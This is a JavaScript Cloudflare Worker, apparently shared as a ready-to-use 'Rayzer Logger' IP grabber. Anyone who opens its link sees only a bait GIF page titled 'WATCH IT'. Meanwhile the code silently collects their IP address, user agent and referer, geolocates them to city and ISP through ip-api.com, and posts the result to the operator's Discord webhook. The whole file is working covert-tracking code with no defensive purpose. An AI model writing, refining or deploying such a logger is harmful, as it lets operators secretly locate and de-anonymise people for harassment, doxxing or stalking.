// /cloudflare worker/DISCORD WEBHOOK/worker-env.js

export default {
    async fetch(request, env, ctx) {
        const WEBHOOK_URL = env.WEBHOOK_URL;
        const GIF_URL = env.GIF_URL || "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

        if (!WEBHOOK_URL) {
            return new Response("ERROR: WEBHOOK_URL environment variable not set!", { status: 500 });
        }

        const ip = request.headers.get("cf-connecting-ip") || "Unknown";
        const userAgent = request.headers.get("user-agent") || "None";
        const referer = request.headers.get("referer") || "None";
        const country = request.headers.get("cf-ipcountry") || "None";

        let geoData = { city: "?", regionName: "?", country: country, isp: "?" };

        try {
            const gRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
            const geo = await gRes.json();
            if (geo.status === "success") {
                geoData = geo;
            }
        } catch (e) { }

        const payload = {
            username: "Rayzer Logger",
            embeds: [{
                title: "New Log 🔍",
                color: 0x5865F2,
                fields: [
                    { name: "IP", value: `\`${ip}\``, inline: true },
                    { name: "Location", value: `${geoData.city}, ${geoData.regionName}, ${geoData.country}`, inline: true },
                    { name: "ISP", value: geoData.isp || "Unknown", inline: false },
                    { name: "User-Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
                    { name: "Referer", value: referer, inline: false }
                ],
                footer: { text: "Rayzer Logger" },
                timestamp: new Date().toISOString()
            }]
        };

        ctx.waitUntil(
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
        );

        return new Response(`
      <!DOCTYPE html>
      <html>
        <head><title>WATCH IT</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
        <body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
          <img src="${GIF_URL}" style="max-width:100%;height:auto;" />
        </body>
      </html>
    `, {
            headers: { "Content-Type": "text/html" }
        });
    }
};
